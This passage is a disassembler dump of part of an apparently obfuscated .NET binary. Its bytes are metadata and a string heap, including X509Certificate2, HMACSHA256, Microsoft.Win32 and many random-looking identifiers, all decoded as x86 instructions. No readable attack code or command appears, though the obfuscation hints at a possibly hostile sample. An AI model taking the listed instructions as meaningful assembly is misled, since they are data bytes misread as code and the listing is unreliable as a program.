  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 75 17             	add    %dh,0x17(%ebp)
  407706:	68 17 80 17 ef       	push   $0xef178017
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	ed                   	in     (%dx),%eax
  40771b:	24 01                	and    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	62 23                	bound  %esp,(%ebx)
  407724:	01 00                	add    %eax,(%eax)
  407726:	00 01                	add    %al,(%ecx)
  407728:	75 00                	jne    0x40772a
  40772a:	00 0e                	add    %cl,(%esi)
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	99                   	cltd
  407733:	22 02                	and    (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	f6 0f 02             	testb  $0x2,(%edi)
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	cb                   	lret
  407743:	16                   	push   %ss
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	48                   	dec    %eax
  407765:	25 00 00 04 00       	and    $0x40000,%eax
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	12 0a                	adc    (%edx),%cl
  407778:	00 00                	add    %al,(%eax)
  40777a:	00 00                	add    %al,(%eax)
  40777c:	04 00                	add    $0x0,%al
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	58                   	pop    %eax
  40778b:	18 00                	sbb    %al,(%eax)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 50 14             	add    %dl,0x14(%eax)
  4077a0:	00 00                	add    %al,(%eax)
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	04 00                	add    $0x0,%al
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	b4 0f                	mov    $0xf,%ah
  4077b4:	00 00                	add    %al,(%eax)
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	0a 00                	or     (%eax),%al
	...
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	cc                   	int3
  4077c5:	00 d8                	add    %bl,%al
  4077c7:	0a 00                	or     (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 45 22             	add    %al,0x22(%ebp)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	0f 20 00             	mov    %cr0,%eax
  4077f1:	00 00                	add    %al,(%eax)
  4077f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 66 1b             	add    %ah,0x1b(%esi)
  407804:	00 00                	add    %al,(%eax)
  407806:	00 00                	add    %al,(%eax)
  407808:	0c 00                	or     $0x0,%al
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	54                   	push   %esp
  40787a:	6f                   	outsl  %ds:(%esi),(%dx)
  40787b:	55                   	push   %ebp
  40787c:	49                   	dec    %ecx
  40787d:	6e                   	outsb  %ds:(%esi),(%dx)
  40787e:	74 36                	je     0x4078b6
  407880:	34 00                	xor    $0x0,%al
  407882:	54                   	push   %esp
  407883:	6f                   	outsl  %ds:(%esi),(%dx)
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	55                   	push   %ebp
  40788d:	49                   	dec    %ecx
  40788e:	6e                   	outsb  %ds:(%esi),(%dx)
  40788f:	74 31                	je     0x4078c2
  407891:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  40789d:	41                   	inc    %ecx
  40789e:	43                   	inc    %ebx
  40789f:	53                   	push   %ebx
  4078a0:	48                   	dec    %eax
  4078a1:	41                   	inc    %ecx
  4078a2:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078a8:	74 5f                	je     0x407909
  4078aa:	55                   	push   %ebp
  4078ab:	54                   	push   %esp
  4078ac:	46                   	inc    %esi
  4078ad:	38 00                	cmp    %al,(%eax)
  4078af:	3c 4d                	cmp    $0x4d,%al
  4078b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b2:	64 75 6c             	fs jne 0x407921
  4078b5:	65 3e 00 62 6b       	gs add %ah,%ds:0x6b(%edx)
  4078ba:	58                   	pop    %eax
  4078bb:	78 62                	js     0x40791f
  4078bd:	4a                   	dec    %edx
  4078be:	6b 4c 54 4b 41       	imul   $0x41,0x4b(%esp,%edx,2),%ecx
  4078c3:	00 49 70             	add    %cl,0x70(%ecx)
  4078c6:	58                   	pop    %eax
  4078c7:	78 59                	js     0x407922
  4078c9:	48                   	dec    %eax
  4078ca:	77 69                	ja     0x407935
  4078cc:	78 71                	js     0x40793f
  4078ce:	51                   	push   %ecx
  4078cf:	4d                   	dec    %ebp
  4078d0:	41                   	inc    %ecx
  4078d1:	00 56 46             	add    %dl,0x46(%esi)
  4078d4:	73 4c                	jae    0x407922
  4078d6:	56                   	push   %esi
  4078d7:	77 59                	ja     0x407932
  4078d9:	45                   	inc    %ebp
  4078da:	70 68                	jo     0x407944
  4078dc:	69 6d 65 41 00 59 6f 	imul   $0x6f590041,0x65(%ebp),%ebp
  4078e3:	48                   	dec    %eax
  4078e4:	62 7a 56             	bound  %edi,0x56(%edx)
  4078e7:	78 63                	js     0x40794c
  4078e9:	74 79                	je     0x407964
  4078eb:	71 6f                	jno    0x40795c
  4078ed:	41                   	inc    %ecx
  4078ee:	00 64 55 4e          	add    %ah,0x4e(%ebp,%edx,2)
  4078f2:	73 70                	jae    0x407964
  4078f4:	5a                   	pop    %edx
  4078f5:	51                   	push   %ecx
  4078f6:	73 52                	jae    0x40794a
  4078f8:	44                   	inc    %esp
  4078f9:	48                   	dec    %eax
  4078fa:	42                   	inc    %edx
  4078fb:	00 44 52 69          	add    %al,0x69(%edx,%edx,2)
  4078ff:	55                   	push   %ebp
  407900:	68 72 48 4f 75       	push   $0x754f4872
  407905:	53                   	push   %ebx
  407906:	41                   	inc    %ecx
  407907:	4b                   	dec    %ebx
  407908:	42                   	inc    %edx
  407909:	00 55 5a             	add    %dl,0x5a(%ebp)
  40790c:	61                   	popa
  40790d:	76 4a                	jbe    0x407959
  40790f:	69 4a 45 63 43 56 4e 	imul   $0x4e564363,0x45(%edx),%ecx
  407916:	42                   	inc    %edx
  407917:	00 65 76             	add    %ah,0x76(%ebp)
  40791a:	6a 52                	push   $0x52
  40791c:	44                   	inc    %esp
  40791d:	70 4a                	jo     0x407969
  40791f:	5a                   	pop    %edx
  407920:	42                   	inc    %edx
  407921:	55                   	push   %ebp
  407922:	42                   	inc    %edx
  407923:	00 4d 7a             	add    %cl,0x7a(%ebp)
  407926:	62 6c 44 63          	bound  %ebp,0x63(%esp,%eax,2)
  40792a:	46                   	inc    %esi
  40792b:	67 6f                	outsl  %ds:(%si),(%dx)
  40792d:	52                   	push   %edx
  40792e:	55                   	push   %ebp
  40792f:	42                   	inc    %edx
  407930:	00 41 47             	add    %al,0x47(%ecx)
  407933:	6c                   	insb   (%dx),%es:(%edi)
  407934:	53                   	push   %ebx
  407935:	77 76                	ja     0x4079ad
  407937:	58                   	pop    %eax
  407938:	7a 66                	jp     0x4079a0
  40793a:	73 42                	jae    0x40797e
  40793c:	00 4d 73             	add    %cl,0x73(%ebp)
  40793f:	62 79 62             	bound  %edi,0x62(%ecx)
  407942:	7a 4d                	jp     0x407991
  407944:	6e                   	outsb  %ds:(%esi),(%dx)
  407945:	67 45                	addr16 inc %ebp
  407947:	43                   	inc    %ebx
  407948:	00 47 43             	add    %al,0x43(%edi)
  40794b:	00 55 64             	add    %dl,0x64(%ebp)
  40794e:	6e                   	outsb  %ds:(%esi),(%dx)
  40794f:	76 4b                	jbe    0x40799c
  407951:	49                   	dec    %ecx
  407952:	69 42 49 54 7a 70 43 	imul   $0x43707a54,0x49(%edx),%eax
  407959:	00 47 51             	add    %al,0x51(%edi)
  40795c:	48                   	dec    %eax
  40795d:	51                   	push   %ecx
  40795e:	46                   	inc    %esi
  40795f:	70 70                	jo     0x4079d1
  407961:	4d                   	dec    %ebp
  407962:	62 72 43             	bound  %esi,0x43(%edx)
  407965:	00 44 54 4b          	add    %al,0x4b(%esp,%edx,2)
  407969:	6b 54 79 45 64       	imul   $0x64,0x45(%ecx,%edi,2),%edx
  40796e:	49                   	dec    %ecx
  40796f:	66 64 76 4a          	data16 fs jbe 0x4079bd
  407973:	6b 73 42 44          	imul   $0x44,0x42(%ebx),%esi
  407977:	00 78 70             	add    %bh,0x70(%eax)
  40797a:	77 4d                	ja     0x4079c9
  40797c:	54                   	push   %esp
  40797d:	4b                   	dec    %ebx
  40797e:	75 56                	jne    0x4079d6
  407980:	6a 59                	push   $0x59
  407982:	64 77 6a             	fs ja  0x4079ef
  407985:	44                   	inc    %esp
  407986:	44                   	inc    %esp
  407987:	00 4d 61             	add    %cl,0x61(%ebp)
  40798a:	70 4e                	jo     0x4079da
  40798c:	61                   	popa
  40798d:	6d                   	insl   (%dx),%es:(%edi)
  40798e:	65 54                	gs push %esp
  407990:	6f                   	outsl  %ds:(%esi),(%dx)
  407991:	4f                   	dec    %edi
  407992:	49                   	dec    %ecx
  407993:	44                   	inc    %esp
  407994:	00 67 65             	add    %ah,0x65(%edi)
  407997:	74 5f                	je     0x4079f8
  407999:	46                   	inc    %esi
  40799a:	6f                   	outsl  %ds:(%esi),(%dx)
  40799b:	72 6d                	jb     0x407a0a
  40799d:	61                   	popa
  40799e:	74 49                	je     0x4079e9
  4079a0:	44                   	inc    %esp
  4079a1:	00 44 43 4b          	add    %al,0x4b(%ebx,%eax,2)
  4079a5:	4b                   	dec    %ebx
  4079a6:	55                   	push   %ebp
  4079a7:	49                   	dec    %ecx
  4079a8:	54                   	push   %esp
  4079a9:	56                   	push   %esi
  4079aa:	69 4c 63 61 44 00 69 	imul   $0x66690044,0x61(%ebx,%eiz,2),%ecx
  4079b1:	66 
  4079b2:	43                   	inc    %ebx
  4079b3:	65 4c                	gs dec %esp
  4079b5:	68 49 49 66 65       	push   $0x65664949
  4079ba:	44                   	inc    %esp
  4079bb:	00 45 74             	add    %al,0x74(%ebp)
  4079be:	6f                   	outsl  %ds:(%esi),(%dx)
  4079bf:	70 4c                	jo     0x407a0d
  4079c1:	51                   	push   %ecx
  4079c2:	73 55                	jae    0x407a19
  4079c4:	54                   	push   %esp
  4079c5:	75 70                	jne    0x407a37
  4079c7:	71 44                	jno    0x407a0d
  4079c9:	00 5a 5a             	add    %bl,0x5a(%edx)
  4079cc:	4f                   	dec    %edi
  4079cd:	41                   	inc    %ecx
  4079ce:	66 43                	inc    %bx
  4079d0:	42                   	inc    %edx
  4079d1:	72 6c                	jb     0x407a3f
  4079d3:	67 51                	addr16 push %ecx
  4079d5:	74 52                	je     0x407a29
  4079d7:	72 44                	jb     0x407a1d
  4079d9:	00 53 64             	add    %dl,0x64(%ebx)
  4079dc:	4c                   	dec    %esp
  4079dd:	55                   	push   %ebp
  4079de:	57                   	push   %edi
  4079df:	76 43                	jbe    0x407a24
  4079e1:	69 75 6c 49 45 00 4d 	imul   $0x4d004549,0x6c(%ebp),%esi
  4079e8:	58                   	pop    %eax
  4079e9:	47                   	inc    %edi
  4079ea:	4b                   	dec    %ebx
  4079eb:	49                   	dec    %ecx
  4079ec:	4f                   	dec    %edi
  4079ed:	49                   	dec    %ecx
  4079ee:	65 79 61             	gs jns 0x407a52
  4079f1:	45                   	inc    %ebp
  4079f2:	59                   	pop    %ecx
  4079f3:	45                   	inc    %ebp
  4079f4:	00 6d 46             	add    %ch,0x46(%ebp)
  4079f7:	59                   	pop    %ecx
  4079f8:	4e                   	dec    %esi
  4079f9:	52                   	push   %edx
  4079fa:	7a 61                	jp     0x407a5d
  4079fc:	44                   	inc    %esp
  4079fd:	52                   	push   %edx
  4079fe:	6d                   	insl   (%dx),%es:(%edi)
  4079ff:	65 45                	gs inc %ebp
  407a01:	00 62 6f             	add    %ah,0x6f(%edx)
  407a04:	6b 6f 77 48          	imul   $0x48,0x77(%edi),%ebp
  407a08:	61                   	popa
  407a09:	67 65 74 51          	addr16 gs je 0x407a5e
  407a0d:	64 73 45             	fs jae 0x407a55
  407a10:	00 58 45             	add    %bl,0x45(%eax)
  407a13:	4e                   	dec    %esi
  407a14:	6f                   	outsl  %ds:(%esi),(%dx)
  407a15:	67 41                	addr16 inc %ecx
  407a17:	4f                   	dec    %edi
  407a18:	4c                   	dec    %esp
  407a19:	42                   	inc    %edx
  407a1a:	73 75                	jae    0x407a91
  407a1c:	45                   	inc    %ebp
  407a1d:	00 51 51             	add    %dl,0x51(%ecx)
  407a20:	67 68 67 45 43 65    	addr16 push $0x65434567
  407a26:	61                   	popa
  407a27:	41                   	inc    %ecx
  407a28:	43                   	inc    %ebx
  407a29:	45                   	inc    %ebp
  407a2a:	6a 43                	push   $0x43
  407a2c:	46                   	inc    %esi
  407a2d:	00 7a 4e             	add    %bh,0x4e(%edx)
  407a30:	5a                   	pop    %edx
  407a31:	4d                   	dec    %ebp
  407a32:	64 61                	fs popa
  407a34:	7a 77                	jp     0x407aad
  407a36:	4f                   	dec    %edi
  407a37:	46                   	inc    %esi
  407a38:	00 73 6e             	add    %dh,0x6e(%ebx)
  407a3b:	70 46                	jo     0x407a83
  407a3d:	4d                   	dec    %ebp
  407a3e:	42                   	inc    %edx
  407a3f:	65 46                	gs inc %esi
  407a41:	4e                   	dec    %esi
  407a42:	64 71 50             	fs jno 0x407a95
  407a45:	46                   	inc    %esi
  407a46:	00 43 61             	add    %al,0x61(%ebx)
  407a49:	76 41                	jbe    0x407a8c
  407a4b:	5a                   	pop    %edx
  407a4c:	51                   	push   %ecx
  407a4d:	4a                   	dec    %edx
  407a4e:	55                   	push   %ebp
  407a4f:	51                   	push   %ecx
  407a50:	4f                   	dec    %edi
  407a51:	41                   	inc    %ecx
  407a52:	53                   	push   %ebx
  407a53:	46                   	inc    %esi
  407a54:	00 57 54             	add    %dl,0x54(%edi)
  407a57:	54                   	push   %esp
  407a58:	56                   	push   %esi
  407a59:	5a                   	pop    %edx
  407a5a:	46                   	inc    %esi
  407a5b:	43                   	inc    %ebx
  407a5c:	63 67 45             	arpl   %esp,0x45(%edi)
  407a5f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a60:	78 55                	js     0x407ab7
  407a62:	46                   	inc    %esi
  407a63:	00 64 42 48          	add    %ah,0x48(%edx,%eax,2)
  407a67:	57                   	push   %edi
  407a68:	63 56 41             	arpl   %edx,0x41(%esi)
  407a6b:	69 54 6d 56 46 00 61 	imul   $0x70610046,0x56(%ebp,%ebp,2),%edx
  407a72:	70 
  407a73:	76 6e                	jbe    0x407ae3
  407a75:	61                   	popa
  407a76:	45                   	inc    %ebp
  407a77:	76 53                	jbe    0x407acc
  407a79:	61                   	popa
  407a7a:	46                   	inc    %esi
  407a7b:	00 75 6c             	add    %dh,0x6c(%ebp)
  407a7e:	67 77 67             	addr16 ja 0x407ae8
  407a81:	5a                   	pop    %edx
  407a82:	57                   	push   %edi
  407a83:	47                   	inc    %edi
  407a84:	77 46                	ja     0x407acc
  407a86:	00 46 59             	add    %al,0x59(%esi)
  407a89:	59                   	pop    %ecx
  407a8a:	46                   	inc    %esi
  407a8b:	54                   	push   %esp
  407a8c:	76 43                	jbe    0x407ad1
  407a8e:	72 6e                	jb     0x407afe
  407a90:	50                   	push   %eax
  407a91:	47                   	inc    %edi
  407a92:	00 43 63             	add    %al,0x63(%ebx)
  407a95:	64 7a 73             	fs jp  0x407b0b
  407a98:	58                   	pop    %eax
  407a99:	7a 50                	jp     0x407aeb
  407a9b:	77 69                	ja     0x407b06
  407a9d:	72 4a                	jb     0x407ae9
  407a9f:	56                   	push   %esi
  407aa0:	47                   	inc    %edi
  407aa1:	00 53 65             	add    %dl,0x65(%ebx)
  407aa4:	57                   	push   %edi
  407aa5:	41                   	inc    %ecx
  407aa6:	62 55 43             	bound  %edx,0x43(%ebp)
  407aa9:	46                   	inc    %esi
  407aaa:	77 47                	ja     0x407af3
  407aac:	00 43 67             	add    %al,0x67(%ebx)
  407aaf:	45                   	inc    %ebp
  407ab0:	41                   	inc    %ecx
  407ab1:	4f                   	dec    %edi
  407ab2:	75 59                	jne    0x407b0d
  407ab4:	6a 45                	push   $0x45
  407ab6:	57                   	push   %edi
  407ab7:	49                   	dec    %ecx
  407ab8:	48                   	dec    %eax
  407ab9:	00 72 76             	add    %dh,0x76(%edx)
  407abc:	65 53                	gs push %ebx
  407abe:	47                   	inc    %edi
  407abf:	44                   	inc    %esp
  407ac0:	4d                   	dec    %ebp
  407ac1:	4d                   	dec    %ebp
  407ac2:	67 57                	addr16 push %edi
  407ac4:	48                   	dec    %eax
  407ac5:	00 6a 47             	add    %ch,0x47(%edx)
  407ac8:	64 79 59             	fs jns 0x407b24
  407acb:	6a 46                	push   $0x46
  407acd:	49                   	dec    %ecx
  407ace:	53                   	push   %ebx
  407acf:	46                   	inc    %esi
  407ad0:	61                   	popa
  407ad1:	48                   	dec    %eax
  407ad2:	00 43 4f             	add    %al,0x4f(%ebx)
  407ad5:	71 72                	jno    0x407b49
  407ad7:	62 70 4e             	bound  %esi,0x4e(%eax)
  407ada:	52                   	push   %edx
  407adb:	49                   	dec    %ecx
  407adc:	62 48 00             	bound  %ecx,0x0(%eax)
  407adf:	4e                   	dec    %esi
  407ae0:	42                   	inc    %edx
  407ae1:	59                   	pop    %ecx
  407ae2:	6b 63 4c 56          	imul   $0x56,0x4c(%ebx),%esp
  407ae6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ae7:	4c                   	dec    %esp
  407ae8:	63 48 00             	arpl   %ecx,0x0(%eax)
  407aeb:	65 66 53             	gs push %bx
  407aee:	4b                   	dec    %ebx
  407aef:	51                   	push   %ecx
  407af0:	48                   	dec    %eax
  407af1:	66 46                	inc    %si
  407af3:	69 5a 6c 48 00 67 65 	imul   $0x65670048,0x6c(%edx),%ebx
  407afa:	74 5f                	je     0x407b5b
  407afc:	41                   	inc    %ecx
  407afd:	53                   	push   %ebx
  407afe:	43                   	inc    %ebx
  407aff:	49                   	dec    %ecx
  407b00:	49                   	dec    %ecx
  407b01:	00 50 45             	add    %dl,0x45(%eax)
  407b04:	47                   	inc    %edi
  407b05:	50                   	push   %eax
  407b06:	63 52 67             	arpl   %edx,0x67(%edx)
  407b09:	78 76                	js     0x407b81
  407b0b:	72 4a                	jb     0x407b57
  407b0d:	65 4f                	gs dec %edi
  407b0f:	49                   	dec    %ecx
  407b10:	00 75 41             	add    %dh,0x41(%ebp)
  407b13:	4b                   	dec    %ebx
  407b14:	61                   	popa
  407b15:	47                   	inc    %edi
  407b16:	6a 58                	push   $0x58
  407b18:	6d                   	insl   (%dx),%es:(%edi)
  407b19:	58                   	pop    %eax
  407b1a:	52                   	push   %edx
  407b1b:	49                   	dec    %ecx
  407b1c:	00 4c 49 58          	add    %cl,0x58(%ecx,%ecx,2)
  407b20:	51                   	push   %ecx
  407b21:	71 4a                	jno    0x407b6d
  407b23:	76 6e                	jbe    0x407b93
  407b25:	61                   	popa
  407b26:	49                   	dec    %ecx
  407b27:	00 41 6c             	add    %al,0x6c(%ecx)
  407b2a:	64 53                	fs push %ebx
  407b2c:	52                   	push   %edx
  407b2d:	72 54                	jb     0x407b83
  407b2f:	76 46                	jbe    0x407b77
  407b31:	72 57                	jb     0x407b8a
  407b33:	68 49 00 71 6e       	push   $0x6e710049
  407b38:	53                   	push   %ebx
  407b39:	59                   	pop    %ecx
  407b3a:	65 56                	gs push %esi
  407b3c:	55                   	push   %ebp
  407b3d:	45                   	inc    %ebp
  407b3e:	72 77                	jb     0x407bb7
  407b40:	6a 49                	push   $0x49
  407b42:	00 50 62             	add    %dl,0x62(%eax)
  407b45:	73 62                	jae    0x407ba9
  407b47:	77 7a                	ja     0x407bc3
  407b49:	78 4f                	js     0x407b9a
  407b4b:	53                   	push   %ebx
  407b4c:	63 4e 6c             	arpl   %ecx,0x6c(%esi)
  407b4f:	49                   	dec    %ecx
  407b50:	00 63 66             	add    %ah,0x66(%ebx)
  407b53:	56                   	push   %esi
  407b54:	50                   	push   %eax
  407b55:	4a                   	dec    %edx
  407b56:	4b                   	dec    %ebx
  407b57:	69 58 46 6e 49 00 6a 	imul   $0x6a00496e,0x46(%eax),%ebx
  407b5e:	79 4d                	jns    0x407bad
  407b60:	68 66 46 52 58       	push   $0x58524666
  407b65:	56                   	push   %esi
  407b66:	6e                   	outsb  %ds:(%esi),(%dx)
  407b67:	49                   	dec    %ecx
  407b68:	00 5a 48             	add    %bl,0x48(%edx)
  407b6b:	73 7a                	jae    0x407be7
  407b6d:	43                   	inc    %ebx
  407b6e:	7a 66                	jp     0x407bd6
  407b70:	52                   	push   %edx
  407b71:	4b                   	dec    %ebx
  407b72:	59                   	pop    %ecx
  407b73:	43                   	inc    %ebx
  407b74:	6c                   	insb   (%dx),%es:(%edi)
  407b75:	4e                   	dec    %esi
  407b76:	4a                   	dec    %edx
  407b77:	00 6d 5a             	add    %ch,0x5a(%ebp)
  407b7a:	7a 4f                	jp     0x407bcb
  407b7c:	58                   	pop    %eax
  407b7d:	54                   	push   %esp
  407b7e:	6b 57 56 78          	imul   $0x78,0x56(%edi),%edx
  407b82:	4f                   	dec    %edi
  407b83:	4a                   	dec    %edx
  407b84:	00 76 64             	add    %dh,0x64(%esi)
  407b87:	4f                   	dec    %edi
  407b88:	57                   	push   %edi
  407b89:	6d                   	insl   (%dx),%es:(%edi)
  407b8a:	54                   	push   %esp
  407b8b:	67 75 53             	addr16 jne 0x407be1
  407b8e:	58                   	pop    %eax
  407b8f:	51                   	push   %ecx
  407b90:	4a                   	dec    %edx
  407b91:	00 75 5a             	add    %dh,0x5a(%ebp)
  407b94:	67 41                	addr16 inc %ecx
  407b96:	4a                   	dec    %edx
  407b97:	6d                   	insl   (%dx),%es:(%edi)
  407b98:	63 48 75             	arpl   %ecx,0x75(%eax)
  407b9b:	4a                   	dec    %edx
  407b9c:	00 48 69             	add    %cl,0x69(%eax)
  407b9f:	41                   	inc    %ecx
  407ba0:	42                   	inc    %edx
  407ba1:	64 64 65 4c          	fs fs gs dec %esp
  407ba5:	4b                   	dec    %ebx
  407ba6:	7a 42                	jp     0x407bea
  407ba8:	4b                   	dec    %ebx
  407ba9:	00 76 68             	add    %dh,0x68(%esi)
  407bac:	4a                   	dec    %edx
  407bad:	69 42 44 44 43 49 77 	imul   $0x77494344,0x44(%edx),%eax
  407bb4:	4d                   	dec    %ebp
  407bb5:	45                   	inc    %ebp
  407bb6:	4b                   	dec    %ebx
